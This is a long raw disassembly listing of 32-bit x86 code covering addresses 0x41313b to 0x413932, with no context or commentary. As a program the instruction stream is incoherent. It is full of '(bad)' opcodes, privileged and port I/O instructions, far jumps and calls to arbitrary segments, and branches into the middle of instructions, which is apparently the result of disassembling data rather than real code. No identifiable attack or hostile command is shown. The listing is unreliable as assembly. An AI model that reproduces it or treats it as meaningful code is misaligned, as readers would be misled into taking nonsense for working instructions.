  41313b:	mov    edi,0xf134924d
  413140:	pop    edi
  413141:	mov    ebp,0x585d1b2e
  413146:	and    BYTE PTR [ebx+0x5523b654],0x91
  41314d:	scas   al,BYTE PTR es:[edi]
  41314e:	int3   
  41314f:	inc    edx
  413150:	loope  0x4131d1
  413152:	adc    edi,DWORD PTR [ecx-0x6c9a32d8]
  413158:	nop
  413159:	in     al,dx
  41315a:	sub    eax,0x9e3eace5
  41315f:	mov    edx,0xa2431ccc
  413164:	nop
  413165:	fdiv   QWORD PTR fs:[ebp+0x14d191c1]
  41316c:	pop    eax
  41316d:	adc    esp,DWORD PTR [esi]
  41316f:	leave  
  413170:	mov    ds:0x992e80c5,al
  413175:	cwde   
  413176:	pop    esp
  413177:	or     bl,ah
  413179:	mov    dl,bh
  41317b:	scas   al,BYTE PTR es:[edi]
  41317c:	inc    esp
  41317d:	imul   edi,DWORD PTR [ebp-0x71],0x2d
  413181:	or     al,0x9d
  413183:	lock ss call 0x6860:0x2ee16c90
  41318c:	jecxz  0x4131ee
  41318e:	pop    DWORD PTR [ebp+0x64]
  413191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413192:	fst    DWORD PTR [ebx+0x3554e1d0]
  413198:	mov    dl,0x81
  41319a:	fidiv  WORD PTR [esi-0x44]
  41319d:	(bad)  
  41319e:	(bad)  
  4131a0:	fisttp WORD PTR [edi]
  4131a2:	aam    0x73
  4131a4:	xor    al,0xf4
  4131a6:	dec    edi
  4131a7:	xor    eax,0xec3290c2
  4131ac:	xor    esp,DWORD PTR [edx]
  4131ae:	in     eax,dx
  4131af:	fs dec ecx
  4131b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131b2:	xchg   edi,eax
  4131b3:	pop    ds
  4131b4:	in     al,0xd0
  4131b6:	retf   
  4131b7:	cs inc esi
  4131b9:	push   esp
  4131ba:	sub    esi,ebp
  4131bc:	cs xchg ecx,eax
  4131be:	(bad)  [esi-0x2dfda17]
  4131c4:	cli    
  4131c5:	mov    ebp,0x95581aa0
  4131ca:	xchg   edx,eax
  4131cb:	mov    cs,WORD PTR [ecx+edx*4+0x41]
  4131cf:	xchg   DWORD PTR ds:0x215d24c4,edi
  4131d5:	mov    bh,0x7c
  4131d7:	aam    0xb9
  4131d9:	test   dh,dh
  4131db:	cmc    
  4131dc:	data16 fsubr st,st(7)
  4131df:	cmp    ch,dh
  4131e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131e2:	or     eax,0x6973d9ec
  4131e7:	mov    ebp,0xe8e25bdc
  4131ec:	cmp    BYTE PTR [edi-0x7555253],bh
  4131f2:	call   0xaf9ee1fe
  4131f7:	inc    esi
  4131f8:	in     al,0xdb
  4131fa:	push   0x6287a32d
  4131ff:	pop    ecx
  413200:	test   eax,0x3269c7c8
  413205:	fcomp  DWORD PTR [ebx-0x1b]
  413208:	adc    al,0x6d
  41320a:	sub    bh,BYTE PTR [ebx-0x7eb8791]
  413210:	ds dec esi
  413212:	js     0x4131d3
  413214:	sar    BYTE PTR [edi+eiz*4],cl
  413217:	stos   DWORD PTR es:[edi],eax
  413218:	mov    cl,0x2b
  41321a:	sbb    al,0x7b
  41321c:	ret    
  41321d:	dec    esi
  41321e:	dec    ebp
  41321f:	jb     0x413283
  413221:	mov    esi,DWORD PTR [ebp-0xd]
  413224:	imul   ebp,esi,0xffffffcd
  413227:	inc    ebp
  413228:	clc    
  413229:	gs inc eax
  41322b:	ins    DWORD PTR es:[edi],dx
  41322c:	jae    0x413274
  41322e:	inc    edx
  41322f:	xchg   edx,eax
  413230:	arpl   dx,cx
  413232:	pop    ecx
  413233:	sub    edx,DWORD PTR [ecx]
  413235:	mov    ds:0x1b5ec6fd,eax
  41323a:	inc    ebx
  41323b:	and    dh,cl
  41323d:	dec    eax
  41323e:	jp     0x4131d7
  413240:	jb     0x41326f
  413242:	aaa    
  413243:	or     ebp,DWORD PTR [edx+edx*1-0x1cd97da3]
  41324a:	mov    ebx,0xfdb86483
  41324f:	xor    BYTE PTR [edi+0x482569d0],bl
  413255:	pop    edx
  413256:	or     al,BYTE PTR [edx]
  413258:	cmp    al,0x7c
  41325a:	in     eax,dx
  41325b:	mov    bh,0xe7
  41325d:	hlt    
  41325e:	add    eax,0xb0eab54d
  413263:	ins    BYTE PTR es:[edi],dx
  413264:	or     eax,0xfc53e22e
  413269:	xchg   esp,eax
  41326a:	adc    ebx,DWORD PTR [edx]
  41326c:	dec    edx
  41326d:	leave  
  41326e:	dec    ecx
  41326f:	cmp    BYTE PTR [ebx+0x13],dh
  413272:	ret    0x62
  413275:	test   BYTE PTR [ebx],al
  413277:	inc    edi
  413278:	xor    eax,0xa05afa66
  41327d:	or     al,0xd2
  41327f:	mov    ds:0x68f45fc4,al
  413284:	imul   esp,DWORD PTR [esp+esi*4+0x60d59de2],0xffffff8a
  41328c:	pop    ss
  41328d:	cmp    al,0x44
  41328f:	jns    0x41328f
  413291:	std    
  413292:	xchg   edx,eax
  413293:	sti    
  413294:	cs popa 
  413296:	rcl    BYTE PTR [ebx-0x23],1
  413299:	shl    BYTE PTR [eax-0x60],0x13
  41329d:	adc    ecx,DWORD PTR [eax-0x45fd1c71]
  4132a3:	out    dx,eax
  4132a4:	cli    
  4132a5:	add    ah,BYTE PTR [edx-0x29]
  4132a8:	inc    ebx
  4132a9:	loop   0x41328e
  4132ab:	icebp  
  4132ac:	mov    eax,ecx
  4132ae:	mov    bh,0xdf
  4132b0:	aaa    
  4132b1:	(bad)  
  4132b2:	(bad)  
  4132b3:	dec    ecx
  4132b4:	(bad)  
  4132b5:	jmp    0x4132b8
  4132b7:	rol    edx,1
  4132b9:	stos   DWORD PTR es:[edi],eax
  4132ba:	int    0x7
  4132bc:	rol    BYTE PTR [ebx+0x64519693],1
  4132c2:	(bad)  
  4132c3:	outs   dx,DWORD PTR ds:[esi]
  4132c4:	jmp    0x7203:0x182d99d
  4132cb:	pop    edx
  4132cc:	das    
  4132cd:	mov    ?,WORD PTR [esp+edi*8-0x67]
  4132d1:	cmc    
  4132d2:	out    0xd0,al
  4132d4:	pop    ebp
  4132d6:	loope  0x4132b0
  4132d8:	pop    ss
  4132d9:	mov    ebp,0x4b7fe1ae
  4132de:	dec    eax
  4132df:	or     esi,DWORD PTR [edi]
  4132e1:	or     BYTE PTR es:[ebp-0x7e5f968d],0x63
  4132e9:	ds push edi
  4132eb:	stos   DWORD PTR es:[edi],eax
  4132ec:	loop   0x4132db
  4132ee:	fidiv  WORD PTR [ebp+0x4b2f4977]
  4132f4:	xor    ecx,ebp
  4132f6:	dec    edx
  4132f7:	push   ebx
  4132f8:	in     al,0x98
  4132fa:	ror    BYTE PTR [ebx],0x5
  4132fd:	pcmpgtb mm2,QWORD PTR [ecx-0x5baab1d8]
  413304:	inc    eax
  413305:	(bad)  
  413306:	imul   eax,DWORD PTR [ebx+0x349ffa90],0xffffffc9
  41330d:	push   esi
  41330e:	jns    0x413292
  413310:	push   es
  413311:	pop    ebp
  413312:	out    0x1c,al
  413314:	xor    DWORD PTR [eax-0x43],eax
  413317:	jl     0x413343
  413319:	ret    0x83d1
  41331c:	mov    eax,ds:0x1b39a5b5
  413321:	es dec eax
  413323:	rcl    DWORD PTR [esi],0x80
  413326:	add    al,al
  413328:	xchg   DWORD PTR [esi-0x16c6a119],edx
  41332e:	dec    esp
  41332f:	fst    QWORD PTR [edi+0x4a]
  413332:	int    0x9
  413334:	popa   
  413335:	lods   al,BYTE PTR ds:[esi]
  413336:	mov    dl,0xf
  413338:	aam    0x39
  41333a:	xchg   ebp,eax
  41333b:	nop
  41333c:	inc    edx
  41333d:	cld    
  41333e:	push   esp
  41333f:	bound  eax,QWORD PTR [eax+edx*8]
  413342:	test   BYTE PTR [ebp+0x23],al
  413345:	fs push eax
  413347:	add    eax,esi
  413349:	cmp    edx,0x20
  41334c:	jne    0x413337
  41334e:	into   
  41334f:	lock cwde 
  413351:	iret   
  413352:	data16 and BYTE PTR [ecx],0x51
  413356:	(bad)  
  413358:	jb     0x413366
  41335a:	ins    BYTE PTR es:[edi],dx
  41335b:	add    cl,BYTE PTR [ecx-0x25]
  41335e:	push   ss
  41335f:	outs   dx,BYTE PTR ds:[esi]
  413360:	or     BYTE PTR [esi+ecx*2],bl
  413363:	stos   BYTE PTR es:[edi],al
  413364:	scas   al,BYTE PTR es:[edi]
  413365:	pop    esp
  413366:	jmp    0x23915123
  41336b:	repz loop 0x41332d
  41336e:	cdq    
  41336f:	je     0x4133bf
  413371:	sub    DWORD PTR [edi+0x697ab15b],ebp
  413377:	retf   0x294c
  41337a:	(bad)  
  41337b:	lds    ebx,FWORD PTR [esi]
  41337d:	pop    ss
  41337e:	nop
  41337f:	inc    esi
  413380:	mov    esi,0x64ef0ef0
  413385:	sbb    DWORD PTR [esi+0x50],0xf8dd99eb
  41338c:	rol    BYTE PTR [edi-0x4ab6eac3],1
  413392:	sbb    esi,ebx
  413394:	sar    eax,1
  413396:	and    edx,DWORD PTR [edi]
  413398:	rol    DWORD PTR [eax-0x3c271557],0x47
  41339f:	aas    
  4133a0:	cmc    
  4133a1:	in     eax,dx
  4133a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a3:	add    bh,dl
  4133a5:	xor    eax,0x26f08829
  4133aa:	popf   
  4133ab:	sbb    BYTE PTR [ebx+0x3b],0x3a
  4133af:	hlt    
  4133b0:	xchg   DWORD PTR [edi],edi
  4133b2:	sbb    DWORD PTR [edx+0x4fc521b2],edi
  4133b8:	inc    DWORD PTR [esi+edi*4-0x36ffdef0]
  4133bf:	nop
  4133c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133c1:	mov    ebp,0xe733b1fa
  4133c6:	and    esp,DWORD PTR [esi+0xf6ec950]
  4133cc:	mov    bh,0xdd
  4133ce:	adc    esp,eax
  4133d0:	adc    ah,0x53
  4133d3:	push   dx
  4133d5:	adc    edi,DWORD PTR [edx-0x47b5338e]
  4133db:	sub    BYTE PTR [ecx+0x39],al
  4133de:	icebp  
  4133df:	dec    edx
  4133e0:	pop    esi
  4133e1:	pop    edx
  4133e2:	xor    eax,0x78bb0b14
  4133e7:	cmp    BYTE PTR [esi],0x36
  4133ea:	jae    0x4133f5
  4133ec:	ficom  DWORD PTR [ebx+0xeb11bcc]
  4133f2:	adc    al,0x2f
  4133f4:	aam    0x87
  4133f6:	jne    0x4133d0
  4133f8:	retf   0x597f
  4133fb:	mov    DWORD PTR [eax-0xa],edx
  4133fe:	ret    
  4133ff:	pop    ds
  413400:	(bad)  
  413401:	test   DWORD PTR [ecx-0x1a],0x6c4ee939
  413408:	sbb    ebp,DWORD PTR [esi+esi*2-0x4a203cd7]
  41340f:	xchg   ecx,eax
  413410:	lea    esp,[eax+0x7e]
  413413:	and    eax,0xc681d8b9
  413418:	dec    edi
  413419:	ret    
  41341a:	pop    ds
  41341b:	adc    al,0x85
  41341d:	retf   
  41341e:	pop    es
  41341f:	arpl   WORD PTR [ebp+edx*1+0x56],ax
  413423:	sti    
  413424:	aas    
  413425:	rcl    BYTE PTR ds:0x460bdbd7,cl
  41342b:	arpl   WORD PTR [eax-0x45027f4d],si
  413431:	mov    DWORD PTR [esi+0x10],ebp
  413434:	inc    ecx
  413435:	in     al,dx
  413436:	inc    ecx
  413437:	rcr    ebx,1
  413439:	and    DWORD PTR [edi-0x4a88961b],edi
  41343f:	fdivr  QWORD PTR [ebp+0x50]
  413442:	in     eax,dx
  413443:	xchg   esp,eax
  413444:	jno    0x4134b9
  413446:	into   
  413447:	into   
  413448:	inc    ecx
  413449:	std    
  41344a:	xchg   edx,eax
  41344b:	test   cl,0x5a
  41344e:	aaa    
  41344f:	push   ebx
  413450:	jmp    0x9eeb:0xf73a5bb6
  413457:	cmp    ecx,DWORD PTR [ebx]
  413459:	imul   esp,DWORD PTR ds:0x3c063c4,0x57b3a39b
  413463:	imul   DWORD PTR [esi+0x23]
  413466:	(bad)
  41346a:	(bad)  
  41346b:	scas   eax,DWORD PTR es:[edi]
  41346c:	int    0x36
  41346e:	mov    ebp,0xd88edb13
  413473:	cwde   
  413474:	xchg   edi,eax
  413475:	pop    ebp
  413476:	icebp  
  413477:	aad    0xd6
  413479:	push   edi
  41347a:	int    0x36
  41347c:	mov    DWORD PTR [ebx+0x1f85fc1b],0xcb29b62f
  413486:	div    edi
  413488:	adc    eax,0x5bd469c0
  41348d:	mov    DWORD PTR [eax+0x1b],ebx
  413490:	pusha  
  413491:	cdq    
  413492:	sbb    al,BYTE PTR [eax]
  413494:	inc    esi
  413495:	push   edx
  413496:	mov    esi,0xf98cf1a0
  41349b:	test   eax,0xb4144fb8
  4134a0:	gs cld 
  4134a2:	fwait
  4134a3:	dec    ecx
  4134a4:	pop    edx
  4134a5:	test   DWORD PTR [ebp+0x6fd7c976],esp
  4134ab:	dec    esp
  4134ac:	add    esp,edi
  4134ae:	dec    eax
  4134af:	jp     0x413508
  4134b1:	iret   
  4134b2:	jmp    0x88e51567
  4134b7:	addr16 ret 
  4134b9:	inc    esp
  4134ba:	das    
  4134bb:	in     eax,dx
  4134bc:	repz mov cl,0x76
  4134bf:	xchg   DWORD PTR [eax-0x9],ecx
  4134c2:	or     edx,DWORD PTR gs:[ecx]
  4134c5:	add    eax,0x43e0c784
  4134ca:	(bad)  
  4134cc:	dec    edi
  4134cd:	and    BYTE PTR [edx+0x79047a4d],al
  4134d3:	push   edx
  4134d4:	mov    ah,0xb7
  4134d6:	sbb    dh,cl
  4134d8:	xchg   ebp,eax
  4134d9:	fnstenv [edx]
  4134db:	mov    ch,0xac
  4134dd:	mov    esp,0x557c1d13
  4134e2:	dec    esi
  4134e3:	mov    dh,0x9c
  4134e5:	cld    
  4134e6:	nop
  4134e7:	pop    ecx
  4134e8:	hlt    
  4134e9:	inc    esp
  4134ea:	sub    al,0x87
  4134ec:	push   ecx
  4134ed:	xchg   edi,eax
  4134ee:	or     ebp,DWORD PTR [ecx+0x1c35d86d]
  4134f4:	retf   0xc1c6
  4134f7:	add    DWORD PTR [edx-0x11],edx
  4134fa:	sub    DWORD PTR [ebx+edi*2],esp
  4134fd:	mov    ah,0x7c
  4134ff:	mov    DWORD PTR [edx],ebp
  413501:	loope  0x41348b
  413503:	cmc    
  413504:	data16 sysexit 
  413507:	ret    
  413508:	ins    DWORD PTR es:[edi],dx
  413509:	dec    ebx
  41350a:	xor    BYTE PTR [ebp-0x5e],0xe2
  41350e:	sbb    bh,al
  413510:	xor    edx,DWORD PTR [edx]
  413512:	mov    edx,0x26caccd
  413517:	jbe    0x4134de
  413519:	mov    BYTE PTR [ebp-0x2b],bl
  41351c:	add    al,0x84
  41351e:	sbb    al,0x50
  413520:	push   ebx
  413521:	xor    eax,0xca534172
  413526:	test   al,0xd0
  413528:	aad    0xef
  41352a:	dec    esi
  41352b:	test   BYTE PTR [ecx-0x9],bh
  41352e:	pop    ecx
  41352f:	push   eax
  413530:	sub    eax,0xd85bc23
  413535:	inc    edi
  413536:	jmp    DWORD PTR ss:[eax-0x6e]
  41353a:	sbb    al,0xe4
  41353c:	mov    BYTE PTR [eax],cl
  41353e:	jb     0x4135b9
  413540:	call   0xd309816a
  413545:	or     ch,BYTE PTR [ecx+edx*8+0x693332cb]
  41354c:	pushf  
  41354d:	dec    ecx
  41354e:	add    BYTE PTR [edi-0x6789373f],0x6f
  413555:	inc    esi
  413556:	jl     0x413562
  413558:	es mov esi,0x93ab78cf
  41355e:	sbb    BYTE PTR [ebp-0x4c30d7],bh
  413564:	fdivr  QWORD PTR ds:0x1ae7eda4
  41356a:	fwait
  41356b:	jg     0x4135ad
  41356d:	imul   esi,DWORD PTR [ebp-0x5],0xbb9ba534
  413574:	xchg   esi,eax
  413575:	mov    ah,0x39
  413577:	add    ah,dh
  413579:	mov    BYTE PTR [esi],al
  41357b:	rcl    BYTE PTR [esi-0x1a],cl
  41357e:	add    BYTE PTR [esi+ebp*8-0x12af287b],al
  413585:	mov    eax,0x514678f0
  41358a:	shr    DWORD PTR [ecx-0x19e1078e],0x28
  413591:	je     0x413514
  413593:	fs hlt 
  413595:	inc    eax
  413596:	call   0x5a51:0x378c23e4
  41359d:	mov    dh,0xc4
  41359f:	repz out 0x16,eax
  4135a2:	push   eax
  4135a3:	das    
  4135a4:	adc    edi,esp
  4135a6:	push   0x2ebadf7b
  4135ab:	sbb    al,BYTE PTR [edx]
  4135ad:	push   ecx
  4135ae:	add    edx,esp
  4135b0:	jmp    0x8597:0xd29cc10d
  4135b7:	lahf   
  4135b8:	pop    es
  4135b9:	mov    edx,eax
  4135bb:	call   DWORD PTR [edx-0x7]
  4135be:	rcl    DWORD PTR [ebx],0x87
  4135c1:	jl     0x4135c1
  4135c3:	(bad)  
  4135c4:	and    edx,DWORD PTR [eax-0x59]
  4135c7:	push   esi
  4135c8:	pushf  
  4135c9:	lods   eax,DWORD PTR ds:[esi]
  4135ca:	aas    
  4135cb:	and    BYTE PTR [ecx],dh
  4135cd:	jo     0x4135a9
  4135cf:	test   eax,0xf07fc938
  4135d4:	rol    DWORD PTR [edi-0x4e886dd8],cl
  4135da:	inc    edx
  4135db:	lock test esi,edi
  4135de:	jb     0x413563
  4135e0:	push   cs
  4135e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135e2:	stc    
  4135e3:	sbb    ebx,0x1d3f4b72
  4135e9:	rol    BYTE PTR [ecx],cl
  4135eb:	push   edi
  4135ec:	push   ecx
  4135ed:	adc    eax,0xe84b3546
  4135f2:	mov    BYTE PTR [edi+0x61507bf1],al
  4135f8:	dec    ebx
  4135f9:	repz shr DWORD PTR [edi],0xcb
  4135fd:	retf   0xdb30
  413600:	sub    dl,0x31
  413603:	rol    DWORD PTR [ecx+0xd],1
  413606:	fisttp DWORD PTR [ebx+edx*8-0x4e]
  41360a:	mov    edi,0xb4cbdc45
  41360f:	outs   dx,BYTE PTR ds:[esi]
  413610:	xor    esi,DWORD PTR [ecx+edi*1+0x25]
  413614:	sbb    cl,ch
  413616:	bound  ecx,QWORD PTR [eax-0x36]
  413619:	cmc    
  41361a:	sahf   
  41361b:	pop    eax
  41361c:	xor    DWORD PTR [edi+0x6dc86b4a],esi
  413622:	jp     0x4135ed
  413624:	stos   DWORD PTR es:[edi],eax
  413625:	xor    al,BYTE PTR [edx-0x5a]
  413628:	dec    edx
  413629:	xor    BYTE PTR [edx+0x25],cl
  41362c:	push   cs
  41362d:	test   ax,0x631a
  413631:	mov    ds:0x62c7f6d2,al
  413636:	and    al,0xc2
  413638:	(bad)  
  413639:	sub    al,0x62
  41363b:	jnp    0x41366d
  41363d:	jb     0x41367e
  41363f:	sbb    eax,0xdffd1b06
  413644:	ficom  WORD PTR [ecx-0x20]
  413647:	push   ebp
  413648:	xor    BYTE PTR [edi-0xb138971],ah
  41364e:	or     BYTE PTR [edi-0x6a],al
  413651:	jge    0x4136ae
  413653:	xchg   DWORD PTR [esp+ecx*4+0x67bd5c2b],ecx
  41365a:	test   DWORD PTR [esp+edx*1+0x7b650145],0x4045297e
  413665:	sbb    eax,0xdac7f4a9
  41366a:	popf   
  41366b:	or     bh,BYTE PTR [edi]
  41366d:	imul   edx,esi,0x59
  413670:	push   0xffffffe6
  413672:	and    esi,ebp
  413674:	les    esp,FWORD PTR [ebp+0x70]
  413677:	ins    BYTE PTR es:[edi],dx
  413678:	jmp    0x413667
  41367a:	jecxz  0x4136ba
  41367c:	or     eax,0x6b282151
  413681:	sar    ebp,cl
  413683:	test   DWORD PTR fs:[esi+0x709e7677],esi
  41368a:	dec    esp
  41368b:	xchg   edx,eax
  41368c:	adc    al,0xed
  41368e:	inc    ecx
  41368f:	cmp    DWORD PTR [ecx],ecx
  413691:	stos   DWORD PTR es:[edi],eax
  413692:	int3   
  413693:	sbb    ch,ah
  413695:	maxps  xmm4,XMMWORD PTR [edi-0x5fd41e9]
  41369c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41369d:	sub    ebx,eax
  41369f:	(bad)  
  4136a1:	popa   
  4136a2:	aaa    
  4136a3:	adc    eax,0x1d086a77
  4136a8:	gs enter 0xd87c,0x95
  4136ad:	xor    eax,0xd5e1268b
  4136b2:	nop
  4136b3:	outs   dx,DWORD PTR ds:[esi]
  4136b4:	push   eax
  4136b5:	mov    edx,DWORD PTR [ebx]
  4136b7:	fwait
  4136b8:	js     0x413642
  4136ba:	lock fucomp st(5)
  4136bd:	mov    ebx,0x95a1d396
  4136c2:	jl     0x4136dc
  4136c4:	cs in  eax,0x10
  4136c7:	mov    edi,0x55960e4d
  4136cc:	mov    al,ds:0x334e3881
  4136d1:	mov    DWORD PTR [ecx-0x72],ebp
  4136d4:	push   ebx
  4136d5:	adc    BYTE PTR [esp+edx*2-0xaee1f11],dh
  4136dc:	push   ebx
  4136dd:	mov    ebp,0x3ec8af6
  4136e2:	test   al,0xea
  4136e4:	mov    cl,cl
  4136e6:	test   BYTE PTR [edi],al
  4136e8:	inc    ecx
  4136e9:	cli    
  4136ea:	out    0x80,eax
  4136ec:	dec    dl
  4136ee:	and    eax,0xce36a72e
  4136f3:	mov    WORD PTR [ebx+0x696c9cf],gs
  4136f9:	jno    0x41368d
  4136fb:	mov    ch,0x3e
  4136fd:	jmp    0xac1d6b88
  413702:	test   DWORD PTR [edi-0xc],ebp
  413705:	int3   
  413706:	xor    esp,edx
  413708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413709:	fisttp WORD PTR [eax-0x334780a6]
  41370f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413710:	in     eax,0xfe
  413712:	shl    ebx,1
  413714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413715:	or     edx,DWORD PTR [eax-0x1c]
  413718:	(bad)  [esi-0x34db2f87]
  41371e:	int3   
  41371f:	aas    
  413720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413721:	loop   0x413754
  413723:	mov    esi,0xecd420ac
  413728:	out    dx,eax
  413729:	std    
  41372a:	into   
  41372b:	xor    ebx,eax
  41372d:	mov    ah,0x56
  41372f:	fisubr WORD PTR [esi+0x41]
  413732:	dec    eax
  413733:	daa    
  413734:	inc    edi
  413735:	or     al,0x4d
  413737:	mov    al,ds:0x7cf4d8e2
  41373c:	mov    dl,0x4
  41373e:	add    DWORD PTR [esi-0x649e3ddb],edi
  413744:	xor    ebp,DWORD PTR [esi-0x72deead2]
  41374a:	fwait
  41374b:	(bad)  
  41374c:	jmp    0x7829e499
  413751:	mov    edx,0xf0a50a
  413756:	cmp    eax,0x466739ff
  41375b:	jns    0x41374d
  41375d:	lahf   
  41375e:	adc    al,0xf6
  413760:	shl    cl,1
  413762:	or     DWORD PTR [edx+ecx*4],eax
  413765:	out    dx,eax
  413766:	stos   BYTE PTR es:[edi],al
  413767:	cli    
  413768:	stos   DWORD PTR es:[edi],eax
  413769:	xor    cl,dh
  41376b:	mov    ah,0x58
  41376d:	add    BYTE PTR [edx+0x735ef01e],cl
  413773:	and    ebp,DWORD PTR [esi+0x1fc46b3e]
  413779:	scas   eax,DWORD PTR es:[edi]
  41377a:	arpl   WORD PTR [edx],di
  41377c:	cwde   
  41377d:	in     eax,0x73
  41377f:	push   esp
  413780:	mov    al,0x86
  413782:	ins    BYTE PTR es:[edi],dx
  413783:	jmp    esi
  413785:	mov    DWORD PTR [ecx-0x724c8c70],esi
  41378b:	mov    ah,0xed
  41378d:	xchg   ebx,eax
  41378e:	ja     0x413790
  413790:	jmp    0x4137cd
  413792:	inc    eax
  413793:	scas   al,BYTE PTR es:[edi]
  413794:	jnp    0x4137aa
  413796:	cld    
  413797:	sbb    DWORD PTR [ebp-0x53],edi
  41379a:	daa    
  41379b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41379c:	ins    BYTE PTR es:[edi],dx
  41379d:	iret   
  41379e:	inc    edx
  41379f:	adc    al,BYTE PTR [edx]
  4137a1:	hlt    
  4137a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137a3:	aas    
  4137a4:	test   al,0x1c
  4137a6:	not    DWORD PTR fs:[ebp-0x2d]
  4137aa:	sbb    BYTE PTR [eax+0x13f0490b],dl
  4137b0:	xlat   BYTE PTR ds:[ebx]
  4137b1:	mov    dl,0xf1
  4137b3:	test   al,0xc2
  4137b5:	xchg   esi,eax
  4137b6:	mov    ebp,0x57ae6c43
  4137bb:	je     0x4137a9
  4137bd:	adc    al,0x4
  4137bf:	adc    eax,0xf2022152
  4137c4:	mov    DWORD PTR [eax-0x649928b],edi
  4137ca:	mov    dh,0xd7
  4137cc:	das    
  4137cd:	inc    ecx
  4137ce:	es (bad) 
  4137d0:	cmp    BYTE PTR [si],0x4f
  4137d4:	lods   al,BYTE PTR ds:[esi]
  4137d5:	sbb    eax,DWORD PTR [esi-0x1a94c454]
  4137db:	pop    edi
  4137dc:	retf   
  4137dd:	fnstcw WORD PTR [eax]
  4137df:	mov    cs,edx
  4137e1:	jge    0x413792
  4137e3:	or     esi,DWORD PTR [ebp+edi*8-0x34]
  4137e7:	test   DWORD PTR [ebp-0x65e7bd96],eax
  4137ed:	rcl    DWORD PTR [edi],cl
  4137ef:	push   ds
  4137f0:	mov    edi,0x3678bdcd
  4137f5:	xchg   ebp,eax
  4137f6:	or     DWORD PTR [eax+0x44a12ed0],ecx
  4137fc:	clc    
  4137fd:	repnz fs push esp
  413800:	inc    ecx
  413801:	push   cs
  413802:	cmp    al,0xd6
  413804:	fimul  WORD PTR [edi]
  413806:	or     DWORD PTR [ebx+ecx*4+0xd],ecx
  41380a:	or     eax,0xf6751f5e
  41380f:	sbb    DWORD PTR [esi+0x43],edx
  413812:	add    eax,0x3a2f216e
  413817:	xor    dh,ah
  413819:	xor    al,0x3d
  41381b:	cs inc ebx
  41381d:	ror    BYTE PTR [ecx+0x39],cl
  413820:	leave  
  413821:	out    dx,eax
  413822:	xchg   esp,eax
  413823:	and    eax,0x749d6f89
  413828:	repnz test eax,0xc97f8e06
  41382e:	mov    WORD PTR [esi-0x4b120885],fs
  413834:	pop    edi
  413835:	adc    esi,DWORD PTR [ecx-0x1d]
  413838:	xchg   esi,eax
  413839:	outs   dx,DWORD PTR ds:[esi]
  41383a:	push   es
  41383b:	jg     0x41381b
  41383d:	or     DWORD PTR [eax-0x63],esi
  413840:	inc    esp
  413841:	imul   edi,DWORD PTR [ebp+0x57237d7f],0x1
  413848:	ror    BYTE PTR [esi+0x4d],1
  41384b:	(bad)  
  41384c:	shr    bh,1
  41384e:	jo     0x4138a7
  413850:	xor    ch,BYTE PTR [ebx]
  413852:	adc    eax,ecx
  413854:	inc    esp
  413855:	outs   dx,DWORD PTR ds:[esi]
  413856:	inc    ecx
  413857:	jnp    0x413885
  413859:	dec    edx
  41385a:	inc    edx
  41385b:	ins    DWORD PTR es:[edi],dx
  41385c:	loopne 0x4138a4
  41385e:	sahf   
  41385f:	es adc dl,0xf1
  413863:	pusha  
  413864:	fldenv [ebp-0x5b62a266]
  41386a:	packssdw mm6,QWORD PTR [eax-0x6ecc93ab]
  413871:	mov    esi,DWORD PTR [edx]
  413873:	sub    BYTE PTR [esi],cl
  413875:	int    0x61
  413877:	repnz lods al,BYTE PTR ds:[esi]
  413879:	out    0x67,eax
  41387b:	mov    dh,0xd0
  41387d:	call   FWORD PTR [ebp-0x4055f192]
  413883:	adc    edx,edx
  413885:	sub    edi,0x3b
  413888:	fsub   DWORD PTR [eax]
  41388a:	xchg   edi,eax
  41388b:	and    DWORD PTR [edi+0x2f],ebp
  41388e:	inc    edi
  41388f:	sti    
  413890:	mov    eax,ds:0xba4a2890
  413895:	or     ecx,eax
  413897:	iret   
  413898:	or     ebx,DWORD PTR [ebx-0x4a]
  41389b:	lahf   
  41389c:	dec    esi
  41389d:	in     eax,dx
  41389e:	nop
  41389f:	inc    esp
  4138a0:	sbb    eax,0x8556707c
  4138a5:	ret    0xdc99
  4138a8:	aas    
  4138a9:	hlt    
  4138aa:	(bad)  
  4138ab:	jg     0x413879
  4138ad:	cmp    eax,0x7141f51b
  4138b2:	jns    0x413896
  4138b4:	call   0x715bf3cb
  4138b9:	mov    ch,0x6f
  4138bb:	call   0x6317:0x3da1d874
  4138c2:	mov    dl,0xc6
  4138c4:	and    eax,0x362d0cdd
  4138c9:	mov    ?,WORD PTR [ebx-0x65]
  4138cc:	hlt    
  4138cd:	xor    dh,BYTE PTR [edx+0x22]
  4138d0:	test   BYTE PTR [edx-0x29],dh
  4138d3:	fmul   DWORD PTR [eax-0x61]
  4138d6:	(bad)  
  4138d7:	push   ecx
  4138d8:	or     DWORD PTR [esi],esp
  4138da:	fisubr WORD PTR [edx-0x7d41f275]
  4138e0:	or     bl,cl
  4138e2:	rcr    DWORD PTR [edx+edi*1-0x401863f9],1
  4138e9:	shl    DWORD PTR [ebp+0x2d348f3e],0xde
  4138f0:	addr16 sbb BYTE PTR fs:[bp+0x327f],ah
  4138f7:	mov    ebx,0xb3bf1cc4
  4138fc:	ds jg  0x4138e2
  4138ff:	ret    
  413900:	sub    esi,ecx
  413902:	and    al,0xa0
  413904:	ret    
  413905:	test   eax,0x854b9bf0
  41390a:	fist   DWORD PTR [ecx-0x2929fcd3]
  413910:	xchg   edi,eax
  413911:	imul   ebp
  413913:	pusha  
  413914:	add    ch,BYTE PTR [ebx+0x51]
  413917:	mov    edx,0x970e41c5
  41391c:	loopne 0x413924
  41391e:	fwait
  41391f:	xor    eax,0x4d8fc382
  413924:	push   es
  413925:	pop    es
  413926:	pushf  
  413927:	lock sub BYTE PTR [esi+0x282a8b53],ah
  41392e:	fisubr DWORD PTR [ebx+eiz*1+0x5]
  413932:	jae    0x41395b
